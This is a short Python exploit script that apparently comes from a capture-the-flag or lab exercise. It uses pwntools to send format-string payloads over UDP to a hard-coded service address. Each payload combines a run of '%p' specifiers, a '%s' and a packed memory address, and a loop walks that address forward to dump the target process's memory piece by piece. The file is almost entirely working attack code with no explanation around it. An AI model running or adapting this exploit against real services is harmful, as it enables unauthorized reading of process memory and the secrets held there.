from pwn import *

r = remote('152.96.7.10', 9090, typ='udp', fam='ipv4')

def send_payload(payload):
    # send "test"
    r.send(payload)
    # receive all data
    r.recv()
    res = r.recv() 
    r.recv()
    r.recv()
    return res + b'\n'

def make_payload_at(location):
    p = b"DEBUG:"
    p += b' %p ' * 17
    p += b' %s '
    p += p32(location)
    return p


loc = 0x00403000
for i in range(0,50):
    res = send_payload(make_payload_at(loc))
    actualRes = res[282:-5]
    print(actualRes)
    loc += len(actualRes) + 1